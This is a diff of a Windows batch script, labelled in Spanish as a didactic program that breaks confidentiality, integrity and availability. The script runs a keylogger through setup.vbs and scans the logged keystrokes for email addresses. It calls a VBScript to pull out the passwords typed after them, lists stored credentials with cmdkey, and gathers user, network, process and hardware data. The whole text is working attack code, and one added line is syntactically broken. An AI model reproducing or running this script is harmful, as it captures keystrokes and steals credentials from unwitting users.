@@ -1,4 +1,5 @@
 
+echo **************************** PROGRAMA INFORMATICO DIDÁCTICO QUE VULNERA LA CIA ( Confidentiality, Integrity, Availability) **************************** >> salida.txt
 setlocal enabledelayedexpansion
 
 :: Simulación de try-catch
@@ -6,14 +7,24 @@ set "ErrorCode=0"
 Set "KeyloggerFailled=0"
 :: Try Block
 
-    call :GetKeyloggerInfo || call :SetDisponibility || set "ErrorCode=1"
+echo **************************** COMANDOS QUE VULNERAR LA CONFIDENCIALIDAD **************************** >> salida.txt
+    call :GetKeyloggerInfo || call :GetSystemInfo || set "ErrorCode=1"
     call :GetSystemInfo || set "ErrorCode=1"
     call :GetUserInfo || set "ErrorCode=1"
+    call :GetCredentials || echo  FALLO LA OBTENCIÓN DE CREDENCIALES MEDIANTE KEYLOGGER>> salida.txt 
+
+echo **************************** COMANDOS QUE VULNERAN LA DISPONIBILIDAD **************************** >> salida.txt
+
     call :GetNetworkInfo || set "ErrorCode=1"
     call :GetProcessInfo || set "ErrorCode=1"
-    call :GetServiceInfo || set "ErrorCode=1"
-    call :GetCredentials || set "ErrorCode=1"
+
+echo **************************** COMANDOS QUE VULNERAN LA INTEGRIDAD **************************** >> salida.txt
+
+    call :GetHardwareInformation || set "ErrorCode=1" 
+    call :GetDriversInfo
+     || set "ErrorCode=1"
     call :SimulateSpoofing || set "ErrorCode=1"
+    call :SetDisponibility || set "ErrorCode=1"
 
 :: Check for errors
 if "%ErrorCode%" NEQ "0" (
@@ -40,14 +51,6 @@ exit /b
     echo **************************** INFORMACION DEL SISTEMA **************************** >> salida.txt
     hostname >> salida.txt
     systeminfo >> salida.txt
-    if exist %windir%\System32\wbem\wmic.exe (
-        wmic os get Caption,CSDVersion,OSArchitecture,Version /value >> salida.txt
-        wmic cpu get Name,NumberOfCores,NumberOfLogicalProcessors /value >> salida.txt
-        wmic memorychip get BankLabel,Capacity,MemoryType,TypeDetail,Speed /value >> salida.txt
-        wmic computersystem get Manufacturer,Model,Name,NumberOfProcessors,PrimaryOwnerName,TotalPhysicalMemory /value >> salida.txt
-    ) else (
-        echo El comando wmic no está disponible en esta versión de Windows. >> salida.txt
-    )
     nbtstat -n >> salida.txt
     netsh trace show providers >> salida.txt
     echo ************************************************************************************* >> salida.txt
@@ -56,7 +59,7 @@ exit /b
 :GetUserInfo
     echo **************************** INFORMACION DE LOS USUARIOS **************************** >> salida.txt
     whoami /all >> salida.txt
-    net localgroup Administrators >> salida.txt
+    net localgroup >> salida.txt
     cmdkey /list >> salida.txt
     net accounts >> salida.txt
     echo ************************************************************************************* >> salida.txt
@@ -66,7 +69,6 @@ exit /b
     echo **************************** INFORMACION DE LA RED **************************** >> salida.txt
     ipconfig /all >> salida.txt
     netstat -ano >> salida.txt
-    nbtstat -n >> salida.txt
     netsh interface ip show config >> salida.txt
     echo ************************************************************************************* >> salida.txt
     exit /b
@@ -74,25 +76,20 @@ exit /b
 :GetProcessInfo
     echo **************************** INFORMACION DE LOS PROCESOS **************************** >> salida.txt
     tasklist >> salida.txt
-    driverquery >> salida.txt
-    netsh helper >> salida.txt
     echo ************************************************************************************* >> salida.txt
     exit /b
 
-:GetServiceInfo
-    echo **************************** INFORMACION DE LOS SERVICIOS **************************** >> salida.txt
-    tasklist >> salida.txt
+:GetDriversInfo
+
+    echo **************************** INFORMACION DE LOS SERVICIOS **************************** >> salida.txt    
     driverquery >> salida.txt
-    netsh helper >> salida.txt
     echo ************************************************************************************* >> salida.txt
     exit /b
 
 :GetKeyloggerInfo
-    echo **************************** INFORMACIÓN DE PULSACIONES DE TECLADO **************************** >> salida.txt
+    echo **************************** INFORMACIÓN DE keystrokes DE TECLADO **************************** >> salida.txt
     mkdir keyloggerLogs
-    if not exist KeyLogger.exe (
-       cscript setup.vbs
-    )
+    cscript setup.vbs
     echo El keylogger está corriendo en segundo plano. >> salida.txt
     echo ************************************************************************************* >> salida.txt
     exit /b
@@ -102,13 +99,28 @@ exit /b
     :: crea archivo passwords.txt dentro de directorio keyloggerLogs
     echo. > keyloggerLogs\passwords.txt
     move keystrokes.txt keyloggerLogs
-    netsh trace start capture=yes
-    netsh trace stop
-    netsh trace show trace > temp_trace.txt
-    findstr /R "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4}" keyloggerLogs\Pulsaciones.txt >> keyloggerLogs\mails.txt
+
+
+    netstat -n > ips.txt
+    setlocal enabledelayedexpansion
+    for /f "tokens=3" %%a in ('findstr /R "^[TCP]*" ips.txt') do (
+        echo Resolviendo %%a...
+        nslookup %%a 1>>temp_trace.txt 2>nul
+    )
+    echo Proceso completado. Revisa el archivo temp_trace.txt
+
+    findstr /R "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4}" keyloggerLogs\keystrokes.txt >> keyloggerLogs\mails.txt
+    ::
+    ::
+    ::
+    :: find passwords
     wscript ExtractAfterEmail.vbs
     type temp_trace.txt >> keyloggerLogs\httpRequests.txt
-    del temp_trace.txt
+    ::
+    ::
+    ::
+    ::
+    
     echo ************************************************************************************* >> salida.txt
     exit /b
 
@@ -144,7 +156,7 @@ exit /b
 :SetDisponibility
     
     Setlocal enabledelayedexpansion
-    echo **************************** Comandos que vulneran la Disponibilidad **************************** >> salida.txt
+
     
     if %KeyloggerFailled% NEQ 1 (
         set "KeyloggerFailled=1"
@@ -154,6 +166,17 @@ exit /b
         exit /b
     )
 
+:GetHardwareInformation
+        if exist %windir%\System32\wbem\wmic.exe (
+            wmic os get Caption,CSDVersion,OSArchitecture,Version /value >> salida.txt
+            wmic cpu get Name,NumberOfCores,NumberOfLogicalProcessors /value >> salida.txt
+            wmic memorychip get BankLabel,Capacity,MemoryType,TypeDetail,Speed /value >> salida.txt
+            wmic computersystem get Manufacturer,Model,Name,NumberOfProcessors,PrimaryOwnerName,TotalPhysicalMemory /value >> salida.txt
+        ) else (
+            echo El comando wmic no está disponible en esta versión de Windows. >> salida.txt
+        )
+
+        exit /b
 
 :: Funciones auxiliares
 
